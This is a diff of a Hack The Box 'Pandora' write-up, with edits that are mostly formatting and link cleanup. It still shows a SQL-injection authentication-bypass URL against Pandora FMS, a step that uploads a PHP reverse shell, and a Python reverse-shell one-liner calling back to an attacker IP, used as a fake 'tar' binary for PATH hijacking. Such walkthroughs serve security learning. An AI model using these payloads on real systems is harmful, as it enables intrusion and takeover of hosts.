@@ -15,8 +15,9 @@ tags:
   - linux
   - easy
   - snmp
-  - hashcat
-  - rules
+  - tunneling
+  - suid
+  - path
 ---
 
 ![](/assets/images/htb-writeup-pandora/pandora_logo.png){: style="float: right; width: 200px; margin-left: 2em"}
@@ -165,7 +166,7 @@ Change it to fit our needs, visit the URL, update the login promt and we've bypa
 http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
 ```
 
-![[Pasted image 20220126161344.png]]
+![](/assets/images/htb-writeup-pandora/pandora02.png)
 
 Go to Admin tools > File manager > Upload file (top right corner), and upload a **php reverse shell**.
 Trigger the reverse by visiting `http://localhost/pandora_console/images/rev.php`.
@@ -228,14 +229,14 @@ matt@pandora:/$ find / -name "tar" -type f 2>&1 | grep -v "Permission denied"
 /usr/bin/tar
 ```
 
-Create a malicious "tar"-file to be executed:
+Create a malicious tar-file to be executed:
 ```bash
 matt@pandora:/dev/shm$ cat tar 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 matt@pandora:/dev/shm$ chmod +x tar
 ```
 
-**NOTE:** It would probably suffice just having `/bin/bash` in the malicious "tar"-binary.
+**NOTE:** It would probably suffice just having `/bin/bash` in the malicious tar-binary.
 
 Change the PATH and run `pandora_backup` to trigger the reverse shell. 
 
@@ -255,7 +256,7 @@ Trying to understand why we get `Operation not permitted` when running commands 
 
 To understand exactly why this was an issue, I spoke with the box creator after completing this box and got this explanation:
 
-*".. its due to apache's mpm_itk module, it sandboxes the namespace and disables SUID as a form of protection when running apache as another user - [https://lists.debian.org/debian-apache/2015/11/msg00022.html](https://lists.debian.org/debian-apache/2015/11/msg00022.html "https://lists.debian.org/debian-apache/2015/11/msg00022.html")"*
+> *".. its due to apache's mpm_itk module, it sandboxes the namespace and disables SUID as a form of protection when running apache as another user - [https://lists.debian.org/debian-apache/2015/11/msg00022.html](https://lists.debian.org/debian-apache/2015/11/msg00022.html "https://lists.debian.org/debian-apache/2015/11/msg00022.html")"*
 
 ```bash
 [root:/git/htb/pandora]# ssh-keygen -t rsa -b 4096 -f matt-id_rsa
@@ -303,5 +304,5 @@ daniel:$6$f4POti4xJyVf3/yD$7/efpNYDq.baYycVczUb4b5LlEBNami3//4TbI6lPNK2MaWPrqbdv
 
 # References
 **Pandora FMS 742 Auth Bypass:**
-https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained
-https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py
+- [Reference #1 - pandora vuln explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)
+- [Reference #2 - sqlpwn.py](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py)
